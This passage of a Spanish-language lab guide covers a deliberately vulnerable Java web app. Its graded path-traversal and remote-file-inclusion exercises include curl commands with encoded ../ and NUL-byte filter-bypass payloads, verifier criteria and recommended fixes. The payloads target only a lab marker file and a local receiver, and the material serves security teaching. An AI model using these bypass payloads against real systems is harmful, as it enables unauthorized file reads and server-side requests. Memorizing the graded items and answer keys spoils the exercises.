**Corrección recomendada:** Usar una lista blanca de nombres o resolver una ruta normalizada bajo un directorio base; no concatenar entrada no confiable a una ruta de recursos.

### pathTraversal-02 · LEVEL_1: lectura inocua del marcador fuera de la base lógica

Salir del directorio scripts/PathTraversal y leer la fixture scripts/training/va-training.txt del classpath. El target usa distribución expandida; no es una lectura arbitraria del host.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La función pasa el nombre sin ningún filtro. El objetivo es únicamente /tmp/va-training.txt creado para el laboratorio, no un secreto ni un archivo del sistema. La cadena de once segmentos ../ se mantiene fija para hacer reproducible el intento, pero la resolución efectiva pertenece al classloader del despliegue.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request pathTraversal-02 --method GET --param fileName=../training/va-training.txt
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

La salida se serializa como JSON y el contenido del recurso se concatena sin saltos de línea.

Si no aparece el marcador, documentar el límite del classloader en vez de sustituir el objetivo por /etc/passwd.

**Corrección recomendada:** No aceptar rutas arbitrarias; aplicar allowlist o normalización con startsWith de una base confiable antes de abrir el recurso.

### pathTraversal-03 · LEVEL_2: contraste de ../ literal frente a puntos y barras codificados

La forma literal ../ debe ser bloqueada por el filtro de la URL; la variante con %2E%2E%2F solo puede alcanzar el marcador si el servidor liga la query decodificada a fileName y conserva la URL cruda codificada para RequestEntity. No afirmar éxito sin VA_LAB_FILE.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El filtro de LEVEL_2 busca la cadena literal ../ en requestEntity.getUrl().toString(), mientras que el nombre usado por readFile proviene de @RequestParam. La separación entre representación cruda y valor decodificado es el punto didáctico.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_2 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_2 --data-raw 'fileName=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Ftmp%2Fva-training.txt'
```

Revisar isValid y la presencia de VA_LAB_FILE; no usar el código de estado como prueba.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar isValid/content del intento literal y del codificado; considerar vulnerable solo si el segundo contiene VA_LAB_FILE."
}
```

**Pistas:**

--data-raw conserva los porcentajes escritos en la query; --data-urlencode vuelve a codificar el valor.

La prueba es de parsing y validación, no requiere ningún comando ejecutado por el servidor.

**Corrección recomendada:** Validar el valor decodificado y normalizado, no una representación textual parcial de la URL; restringirlo a una base conocida.

### pathTraversal-04 · LEVEL_3: el bloqueo de .. literal también depende de la URL cruda

La entrada literal con .. debe resultar en isValid=false. La variante con ambos puntos codificados es solo un candidato de bypass y requiere que content contenga VA_LAB_FILE para considerarse evidencia.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

LEVEL_3 amplía el texto bloqueado desde ../ a .., pero sigue inspeccionando requestEntity.getUrl().toString() y no hace canonicalización de fileName.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_3 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_3 --data-raw 'fileName=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Ftmp%2Fva-training.txt'
```

Registrar el cuerpo JSON completo de ambas respuestas, sin reemplazarlo por una conclusión basada en HTTP 200.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar rechazo del literal y evaluar el candidato codificado únicamente por isValid y VA_LAB_FILE."
}
```

**Pistas:**

El nombre ligado puede estar decodificado aunque la cadena inspeccionada por el filtro siga codificada.

La respuesta negativa normal es {"content":null,"isValid":false}.

**Corrección recomendada:** Canonicalizar una vez el valor ya decodificado y verificar que el destino permanezca dentro de una raíz permitida.

### pathTraversal-05 · LEVEL_4: barra codificada en mayúsculas como contraste de filtro textual

La candidata con %2E%2E%2F oculta tanto .. como %2f minúsculo en la URL cruda. Solo se debe marcar como alcanzable si el cuerpo incluye VA_LAB_FILE; de lo contrario informar el rechazo o la limitación del contenedor.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El cuarto nivel agrega una comparación literal de %2f sin hacerla insensible a mayúsculas. La entrada no solicita secretos y el resultado se valida por el marcador de entrenamiento.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_4 --data-raw 'fileName=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Ftmp%2Fva-training.txt'
```

Verificar el JSON y buscar exactamente VA_LAB_FILE en content.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-05 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "La codificación estándar del cliente no produjo lectura de la fixture en este filtro. Seguir el análisis de mayúsculas/minúsculas y la guía; sin puntos por una expectativa estática."
}
```

**Pistas:**

La comparación de LEVEL_4 busca la forma minúscula %2f.

El parámetro lógico después del binding sigue representando separadores de ruta.

**Corrección recomendada:** Evitar listas negras de codificaciones; decodificar de forma canónica, rechazar caracteres de ruta no permitidos o usar un identificador de recurso en vez de una ruta.

### pathTraversal-06 · LEVEL_5: puntos codificados y separadores literales contra el filtro insensible

La forma %2E%2E/ evita .. literal y no contiene la secuencia %2f, incluso después de toLowerCase(), porque los separadores se enviaron literales. Solo VA_LAB_FILE en content sería una observación positiva.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

LEVEL_5 corrige la sensibilidad a mayúsculas de la barra codificada, pero no deja de basarse en un filtro sobre la URL cruda. Se contrasta con LEVEL_4 sin cambiar el objetivo inocuo.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_5 --data-raw 'fileName=%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/tmp/va-training.txt'
```

Revisar isValid y content; no atribuir hallazgo por observar solo HTTP 200.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-06 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Práctica de transporte y filtros: la receta original no leyó la fixture en la integración expandida."
}
```

**Pistas:**

Los puntos están codificados en mayúsculas, mientras que las barras permanecen como /.

El control positivo UserInfo.json de LEVEL_5 debe seguir funcionando independientemente del candidato.

**Corrección recomendada:** Aplicar una única decodificación canónica y una validación estructural de nombre, o resolver con Path.normalize y comprobar la raíz permitida.

### pathTraversal-07 · LEVEL_6: control negativo de validación sobre el parámetro ya ligado

El intento literal debe devolver isValid=false y content=null porque fileName contiene ... No se debe presentar un doble encoding especulativo como bypass confirmado sin observar VA_LAB_FILE.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este nivel permite enseñar una distinción importante: la clase está etiquetada UNSECURE, pero su comprobación se hace sobre el valor ligado y el intento directo está bloqueado. El informe no convierte la etiqueta en una afirmación de explotación efectiva.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_6 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

Confirmar JSON con isValid=false; el HTTP 200 es normal en esta aplicación.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-07 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": false,
  "path": "isValid"
}
```

**Pistas:**

@RequestParam entrega al método el valor decodificado.

No es necesario ni está permitido usar archivos del sistema como objetivo.

**Corrección recomendada:** Mantener la defensa en profundidad con allowlist y base normalizada; rechazar también separadores y bytes inválidos antes de cualquier apertura.

### pathTraversal-08 · LEVEL_7: truncamiento NUL con objetivo inocuo y sufijo de control

El cliente codifica un NUL real como %00. El handler corta allí y lee la fixture del classpath, nunca una ruta del host.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El método comprueba la presencia de un nombre permitido en queryFileName y luego corta en el primer carácter NUL. La prueba es segura porque el prefijo apunta solo al archivo de entrenamiento y no al host ni a un secreto.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request pathTraversal-08 --method GET --param-encoded fileName=..%2Ftraining%2Fva-training.txt%00UserInfo.json
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

--data-raw conserva el texto %00 como escape HTTP; no se debe introducir un byte NUL literal en la shell.

El sufijo UserInfo.json es un nombre de recurso permitido, no un objetivo de lectura.

**Corrección recomendada:** Rechazar bytes NUL antes de cualquier procesamiento y aplicar una allowlist exacta o resolución normalizada que no admita sufijos de validación separados del destino.

### pathTraversal-09 · LEVEL_8: NUL más filtro ../ en URL cruda

Contrastar el corte en NUL con el filtro de URL del nivel 8 usando exclusivamente la fixture.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Contrasta con LEVEL_7: se conserva la lógica de NUL pero se añade un filtro textual que no examina la ruta normalizada. Se usan los mismos controles inocuos.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request pathTraversal-09 --method GET --param-encoded fileName=..%2Ftraining%2Fva-training.txt%00UserInfo.json
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "contains",
  "value": "VA_LAB_FILE"
}
```

**Pistas:**

La condición ALLOWED_FILE_NAMES se evalúa sobre queryFileName antes de truncar.

No confundir un 200 de error lógico con una lectura positiva.

**Corrección recomendada:** Eliminar la dependencia de la URL cruda, rechazar NUL y validar el valor decodificado mediante base normalizada o allowlist.

### pathTraversal-10 · LEVEL_10: contraste NUL con barra codificada en mayúsculas

La candidatura usa %2E%2E%2F y el sufijo %00UserInfo.json. El filtro de LEVEL_10 no debe ver .. literal, pero sí puede ver %2f tras toLowerCase(); solo el marcador en content demostraría acceso.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este ejercicio hace visible la diferencia entre la defensa añadida en LEVEL_10 y el bypass de mayúsculas de LEVEL_4: convertir la URL a minúsculas neutraliza ese cambio de casing.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_10 --data-raw 'fileName=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Ftmp%2Fva-training.txt%00UserInfo.json'
```

Observar isValid/content y compararlo con LEVEL_4, sin emplear archivos reales del sistema.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar con LEVEL_4 y documentar si el filtro de %2f minúsculo bloquea antes del truncamiento; exigir VA_LAB_FILE para cualquier resultado positivo."
}
```

**Pistas:**

El check de LEVEL_10 hace toLowerCase() antes de buscar %2f.

El sufijo permitido no convierte el resultado en una lectura válida por sí solo.

**Corrección recomendada:** No usar filtros por substrings; validar el valor canónico, rechazar NUL y limitar el resultado normalizado al directorio base.

### pathTraversal-11 · LEVEL_11: filtro insensible a mayúsculas con separadores literales

La variante %2E%2E/ no contiene .. literal ni %2f codificado en la URL cruda, aunque el valor ligado puede representar ../; si además pasa el manejo de NUL y la resolución del classloader, VA_LAB_FILE sería la única evidencia positiva.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

LEVEL_11 cierra la diferencia de mayúsculas de %2F, pero no comprueba una ruta normalizada. Se utilizan puntos codificados y slash literal para no presentar la secuencia prohibida en la representación que inspecciona el método.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_11 --data-raw 'fileName=%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/tmp/va-training.txt%00UserInfo.json'
```

Confirmar el marcador en content y registrar por separado cualquier rechazo de %00 del stack HTTP.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-11 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt%00UserInfo.json

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "La receta con %00 literal no demostró lectura. Comparar transporte y filtro sin puntuar un cuerpo vacío."
}
```

**Pistas:**

El filtro usa requestEntity.getUrl().toString().toLowerCase().contains("%2f").

Una respuesta isValid=false no prueba que el filtro sea seguro en general; solo documenta este caso.

**Corrección recomendada:** Validar después de decodificar, normalizar y comprobar la raíz; eliminar el patrón de aceptar un nombre permitido después de NUL.

### pathTraversal-12 · LEVEL_12: control negativo de NUL frente a validación del parámetro

El valor ligado contiene .. antes de cualquier sufijo y debe resultar en isValid=false; añadir UserInfo.json después de %00 no elimina esa comprobación. Este ejercicio no afirma un bypass adicional por doble encoding.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_12 combina truncamiento NUL con comprobación de .. sobre el parámetro ya ligado, por lo que es un control negativo útil frente a los niveles que filtran la URL cruda.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_12 --data-raw 'fileName=../../../../../../../../../../../../tmp/va-training.txt%00UserInfo.json'
```

Comprobar que el JSON mantiene HTTP 200 pero isValid=false y content=null.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-12 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt%00UserInfo.json

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": false,
  "path": "isValid"
}
```

**Pistas:**

La condición de LEVEL_12 es !queryFileName.contains("..") además de la búsqueda del nombre permitido.

La condición original UNSECURE no sustituye una prueba del comportamiento concreto.

**Corrección recomendada:** Aplicar allowlist/normalización sobre el valor decodificado y rechazar byte NUL antes de cualquier transformación.

### pathTraversal-13 · LEVEL_13: lista blanca exacta como control positivo/negativo

UserInfo.json debe ser isValid=true; el intento de ruta al marcador debe ser isValid=false/content=null. Ambos pueden ser HTTP 200. La lista blanca no debe aceptar el nombre del marcador aunque el archivo exista.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

LEVEL_13 no intenta bloquear cada variante de traversal: solo compara igualdad exacta con dos nombres. Es la primera variante segura del controlador y el test incluye el control de NUL.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_13 --data-urlencode 'fileName=UserInfo.json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_13 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

Comparar isValid/content; no interpretar el 200 del rechazo como lectura.

Registrar la misma prueba con el cliente del laboratorio:
lab request pathTraversal-13 --method GET --param fileName=../../../../../../../../../../../../tmp/va-training.txt

**Criterio del verificador:**

```json
{
  "kind": "json",
  "value": false,
  "path": "isValid"
}
```

**Pistas:**

Variant.SECURE aparece en la anotación del método.

El positive control también verifica que la defensa no rompe el recurso permitido.

**Corrección recomendada:** Conservar una lista blanca de identificadores o nombres exactos; si se amplía a una carpeta, usar resolución normalizada y controles de symlink según el backend.

### pathTraversal-14 · LEVEL_14: normalización léxica y permanencia bajo la base

OwaspAppInfo.json debe ser aceptado como control positivo; la ruta normalizada hacia /tmp/va-training.txt debe dejar de empezar por /scripts/PathTraversal/ y devolver isValid=false. Un NUL inválido también se rechaza según el test.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El nivel resuelve lexicalmente base y objetivo y compara startsWith. El objetivo de entrenamiento permite probar la frontera sin leer un secreto; el rechazo se puede verificar con isValid=false.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_14 --data-urlencode 'fileName=OwaspAppInfo.json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_14 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

Verificar JSON isValid/content en ambos casos y no usar el status HTTP como único criterio.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar positivo OwaspAppInfo.json y negativo de traversal mediante isValid/content; el marcador no debe ser necesario para demostrar el bloqueo."
}
```

**Pistas:**

El método no se limita a los dos nombres permitidos, pero sí exige que el target normalizado empiece por la base.

El objetivo inocuo está fuera de esa base lógica; no lo sustituyas por un archivo del host.

**Corrección recomendada:** Mantener la comparación con una base absoluta normalizada y, si se usa filesystem real, considerar realpath/symlink y permisos además de la comprobación léxica.

### pathTraversal-15 · LEVEL_15: patrón de nombre seguro y control de separadores

UserInfo.json debe ser isValid=true; el candidato con ../, separadores y extensión del marcador no coincide con el patrón y debe ser isValid=false/content=null. Un NUL embebido también debe rechazarse.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La expresión regular permite letras, dígitos, guion bajo, guion, un punto y una extensión de 2 a 5 caracteres. Al no aceptar /, \, .. ni NUL, no deja construir segmentos de traversal.

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_15 --data-urlencode 'fileName=UserInfo.json'
```

```bash
curl -i --get http://target:9090/VulnerableApp/PathTraversal/LEVEL_15 --data-urlencode 'fileName=../../../../../../../../../../../../tmp/va-training.txt'
```

Revisar los dos cuerpos JSON: positivo content no nulo y negativo content=null.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar el positivo UserInfo.json y el negativo de traversal por isValid/content; no atribuir puntuación a un click de la interfaz."
}
```

**Pistas:**

La validación ocurre antes de readFile y usa matcher.matches(), no una búsqueda parcial.

El status 200 es uniforme; la evidencia está en el cuerpo JSON.

**Corrección recomendada:** Preferir identificadores opacos o una allowlist; si la aplicación necesita nombres dinámicos, conservar la validación estructural y la comprobación de la base normalizada.

### Límites de esta familia

[
  "Este informe es una verificación estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a; no afirma que se hayan ejecutado las peticiones contra target ni que una imagen concreta resuelva /tmp/va-training.txt mediante Class.getResourceAsStream.",
  "El classloader puede limitarse a recursos del classpath, normalizar porcentajes antes de RequestEntity o rechazar %00 en el proxy, Tomcat o Spring. Por eso los ejercicios con codificación y NUL tienen incertidumbre explícita y exigen comprobar el cuerpo y el marcador.",
  "Un HTTP 200 no prueba lectura, bypass ni vulnerabilidad: readFile devuelve 200 también con isValid=false y content=null. El verificador sugerido debe inspeccionar JSON.isValid y, para la prueba inocua, buscar VA_LAB_FILE en content.",
  "El reflejo de un valor no prueba ejecución XSS, un 200 no prueba IDOR y no se atribuye puntaje por hacer clic en la interfaz. En esta familia no se usan payloads XSS, command injection, SSRF, RFI o XXE.",
  "Los niveles 1 a 12 se clasifican vulnerables por su código y sus anotaciones UNSECURE/originales, pero un payload concreto puede ser bloqueado por capas HTTP o por la resolución de recursos. LEVEL_6 y LEVEL_12 se documentan además con controles negativos porque sus chequeos sobre el parámetro ligado rechazan el intento directo.",
  "No se solicita secret.json, /etc/passwd, credenciales, archivos del host ni destinos externos. El único objetivo fuera del directorio lógico es /tmp/va-training.txt con el marcador VA_LAB_FILE creado para entrenamiento.",
  "La plantilla JavaScript inserta datos de recursos en innerHTML, pero este informe no convierte ese detalle de presentación en una prueba de XSS ni lo usa para validar path traversal.",
  "El chequeo manual debe conservar una respuesta positiva y su control negativo. La ausencia del marcador puede significar rechazo correcto, classloader aislado, normalización intermedia o archivo de entrenamiento no montado; debe registrarse la causa observable sin sobreafirmar."
]

## Inclusión remota y carga de clases

La familia implementa una inclusión/recuperación remota controlada por el servidor: el parámetro de consulta `url` llega sin una lista de permitidos, se convierte en `java.net.URL`, se transforma en URI y se entrega a un `RestTemplate`; el texto recibido se inserta sin escape en una envoltura HTML. El controlador se declara con `@VulnerableAppRestController(value = "RemoteFileInclusion")`, y cada método se expone con `@VulnerableAppRequestMapping(value = "LEVEL_n")`, por lo que, con la base autorizada, las rutas son `/VulnerableApp/RemoteFileInclusion/LEVEL_1` y `/VulnerableApp/RemoteFileInclusion/LEVEL_2`. La clase está activa únicamente con el perfil Spring `unsafe`. El nivel 2 añade solo una condición de presencia de un carácter NUL (`\u0000`) en el valor, no una validación de origen, esquema, destino, redireccionamiento, tamaño ni contenido; por tanto, esa condición no constituye una mitigación de SSRF/RFI. Este documento no presume que una petición haya funcionado: describe lo que se verifica en el código y separa la observación del receptor local de un simple estado HTTP.

### Todos los niveles originales

#### `GET /VulnerableApp/RemoteFileInclusion/LEVEL_1`

**Entrada:** {
  "url": "Parámetro de consulta opcional en la firma HTTP, pero necesario para que el flujo intente una recuperación. Debe ser una URL absoluta aceptada por `java.net.URL`; las demás claves de la query se ignoran porque el método solo lee `queryParams.get(\"url\")`."
}

Obtiene `url`; si no es nulo, construye `URL`, crea un `RestTemplate` por petición y ejecuta `getForObject(url.toURI(), String.class)`. El texto recibido se concatena a un `StringBuilder` y se devuelve dentro de `<html><title>Security Testing</title><body><h1>Vulnerable Application </h1>...</body></html>`. Si falta `url`, o se produce `IOException`/`URISyntaxException`, el método conserva un payload vacío y aun así responde `HTTP 200`.

La anotación de nivel usa el método por defecto `GET` y la variante por defecto `UNSECURE`. No hay `@AttackVector`, `@ChallengeCard`, `htmlTemplate` ni archivo de tests/plantilla específico de RFI en el commit inspeccionado. El logger se inicializa con `PathTraversalVulnerability.class`, un detalle de registro que no cambia el flujo. El riesgo concreto es que el servidor realiza una solicitud a una URL controlada por el cliente y refleja el cuerpo sin escape; la demostración de este informe se limita a `receiver:8081` autorizado. Un 200 solo demuestra la envoltura/controlador, no que el receptor haya sido contactado.

#### `GET /VulnerableApp/RemoteFileInclusion/LEVEL_2`

**Entrada:** {
  "url": "Parámetro de consulta que debe contener el carácter NUL real (`\\u0000`) después de la decodificación HTTP para entrar en la rama vulnerable. La comprobación exacta es `queryParameterURL.contains(NULL_BYTE_CHARACTER)`; claves adicionales se ignoran."
}

Si `url` no es nulo y contiene NUL, repite exactamente la conversión a `URL`, `toURI()`, solicitud `RestTemplate` y envoltura HTML del nivel 1. Sin NUL no intenta la red y devuelve la envoltura vacía con `HTTP 200`. Las excepciones `IOException` y `URISyntaxException` también se absorben y dejan el cuerpo vacío.

El filtro de NUL es una condición de entrada frágil, no una allowlist ni una defensa de red: no verifica host, esquema, IP, DNS, redirects, tiempo, tamaño o contenido. Para transmitirlo en una query con curl se debe conservar `%00` en bruto (`--data-raw`); `--data-urlencode 'url=http://receiver:8081/%00'` suele producir `%2500`, que al decodificarse queda como los caracteres literales `%00` y no satisface `contains('\u0000')`. El comportamiento posterior de `URL.toURI()` y del contenedor ante NUL/`%00` depende de la versión de Java y del servidor, por lo que el posible acceso al receptor se verifica de forma manual y no se promete.

### rfi-01 · Nivel 1: control positivo seguro contra el receptor local

El código intenta que `target` haga un GET a `http://receiver:8081/` y, si el receptor entrega texto y la red del laboratorio lo permite, ese texto queda dentro de la envoltura HTML de la respuesta de `target`. La respuesta del controlador puede ser 200 y estar vacía incluso si la solicitud remota falló; no se declara éxito por ese estado.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Es el control positivo mínimo del nivel 1: el valor permitido para esta práctica es únicamente el receptor local autorizado, no un host externo, un servicio interno distinto ni un archivo del sistema. `--data-urlencode` se usa aquí porque el valor no contiene `%00` y evita errores de escape en la query. La falta de validación de host/esquema está en el código, pero la prueba no necesita aprovechar destinos peligrosos.

Desde Kali, ejecutar: `curl -i --get http://target:9090/VulnerableApp/RemoteFileInclusion/LEVEL_1 --data-urlencode 'url=http://receiver:8081/'`.

Guardar por separado los encabezados, el estado y el cuerpo de target; no interpretar `HTTP/1.1 200` como prueba de una solicitud saliente.

En el receptor autorizado, buscar una petición GET a `/` originada por la red del laboratorio y correlacionarla con la ejecución. Si receiver no expone logs consultables, marcar el resultado como no verificable, no como aprobado.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Correlacionar la hora y ruta de la solicitud en los logs o panel del receptor inocuo con la respuesta de target. Solo considerar confirmado el comportamiento servidor-a-receptor si se observa la entrada en receiver; comparar además el cuerpo devuelto por receiver, si el laboratorio lo documenta."
}
```

**Pistas:**

La clave debe llamarse exactamente `url`; las otras claves de consulta no son leídas por esta clase.

El código devuelve HTML genérico aunque el cuerpo remoto sea vacío; inspecciona también la evidencia independiente en receiver.

No cambies el destino a `localhost`, metadata, archivos o Internet: el receptor local es el único destino permitido para este ejercicio.

**Corrección recomendada:** No aceptar una URL arbitraria si la funcionalidad no es imprescindible. Si existe un caso de uso legítimo, aplicar una allowlist exacta de esquemas, hosts y puertos; resolver y validar cada dirección (incluidos redirects) contra rangos privados, loopback, link-local y metadata; imponer timeouts, límites de respuesta y controles de DNS; y no insertar el texto remoto como HTML sin escape. Registrar y bloquear errores en vez de convertirlos silenciosamente en un 200 vacío.

### rfi-02 · Nivel 1: control negativo sin parámetro de URL

Sin `url`, el método no crea `URL`, no instancia el fetch para el receptor y devuelve la plantilla HTML con el payload vacío. Es esperable un 200 por diseño, incluso en este control negativo.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este control separa la respuesta genérica del controlador de la evidencia de inclusión. Sirve para evitar el falso positivo de contar cualquier 200 o cualquier HTML de la plantilla como prueba de RFI.

Ejecutar el negativo desde Kali: `curl -i --get http://target:9090/VulnerableApp/RemoteFileInclusion/LEVEL_1`.

Comparar el cuerpo con la plantilla observada en el control positivo y revisar receiver para confirmar que no hubo una solicitud causada por esta ejecución.

Registrar por separado `status`, `body` y evidencia del receptor; un status 200 sin tráfico remoto debe quedar como control negativo, no como vulnerabilidad demostrada por sí solo.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar la salida con el positivo y verificar en receiver que no apareció una petición correspondiente a esta segunda ejecución; el texto `Vulnerable Application` solo confirma la plantilla, no demuestra ausencia de tráfico por sí mismo."
}
```

**Pistas:**

La condición de nivel 1 es `queryParameterURL != null`; una cadena vacía no es lo mismo que parámetro ausente y puede terminar en una excepción capturada.

La respuesta siempre se envuelve con `GenericUtils.wrapPayloadInGenericVulnerableAppTemplate`, incluso cuando el payload es vacío.

**Corrección recomendada:** Para un endpoint seguro, rechazar la ausencia de un recurso requerido con un error de validación apropiado y, sobre todo, mantener una política de destinos permitidos antes de realizar cualquier conexión. No usar el 200 vacío como señal de éxito o fallo de seguridad.

### rfi-03 · Nivel 2: control positivo con NUL codificado para el receptor local

Si el contenedor decodifica `%00` a `\u0000` y la combinación Java URL/URI lo admite, la condición del nivel 2 se cumple e intenta contactar el receptor local; el path puede normalizarse al convertirse a URL/URI. Si el runtime rechaza o normaliza el carácter antes del fetch, el código puede devolver 200 con la envoltura vacía. Ambas posibilidades son compatibles con el código y deben distinguirse mediante receiver, no mediante el estado 200.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El nivel 2 no debe probarse con archivos ni destinos externos. El comando usa `--data-raw` de forma deliberada: `--data-urlencode 'url=http://receiver:8081/%00'` codifica el signo `%` y normalmente entrega `%2500`, que no se convierte en el carácter NUL que el código busca. La única interacción permitida sigue siendo el receptor local.

Ejecutar en Kali, conservando `%00` en bruto: `curl -i --get 'http://target:9090/VulnerableApp/RemoteFileInclusion/LEVEL_2' --data-raw 'url=http://receiver:8081/%00'`.

No sustituir ese comando por `--data-urlencode .../%00` sin comprobar la traza: esa forma suele enviar `%2500` y activa el control negativo del nivel.

Revisar la petición recibida por receiver y el cuerpo de target. Si target devuelve 200 sin petición en receiver, anotar que el filtro pudo no coincidir o que `URL.toURI()` no permitió continuar; no atribuir éxito al status.

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Verificar primero que la solicitud HTTP enviada conserva `%00` en la query (sin convertirlo en `%2500`), y después correlacionar en receiver una petición causada por target. Si no hay petición, reportar la incertidumbre de transporte/normalización y no afirmar que el nivel fue explotado."
}
```

**Pistas:**

La comprobación del código busca el carácter NUL real (`String.valueOf((char) 0)`), no los cuatro caracteres `\`, `u`, `0`, `0` ni la secuencia textual `%00` después de la decodificación.

Una observación de receiver es evidencia de la solicitud saliente; no es necesario ni está permitido usar un payload de shell, un archivo del host o un destino no local.

**Corrección recomendada:** Eliminar la recuperación arbitraria; si se requiere una URL, aplicar allowlist de destino y protocolo, bloquear caracteres de control antes de parsear, validar el resultado después de cada redirección, limitar recursos y devolver una representación de datos escapada. Nunca tratar la presencia de NUL como una validación de seguridad.

### rfi-04 · Nivel 2: control negativo sin NUL

El valor es una URL válida pero no contiene `\u0000`, por lo que la condición específica del nivel 2 es falsa y el método no intenta el fetch. Debe devolver la envoltura HTML vacía con 200; ese 200 no demuestra la ausencia salvo que se contraste con receiver.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este negativo demuestra la diferencia de control de flujo entre una URL ordinaria y una que intenta transportar NUL. También hace visible que el nivel 2 no es una defensa general: solo cambia la condición previa y conserva el fetch sin allowlist cuando la condición se cumple.

Ejecutar el negativo: `curl -i --get http://target:9090/VulnerableApp/RemoteFileInclusion/LEVEL_2 --data-urlencode 'url=http://receiver:8081/'`.

Comparar la respuesta y la evidencia del receptor con el positivo del nivel 2; revisar que no se haya enviado `%00` ni un byte NUL.

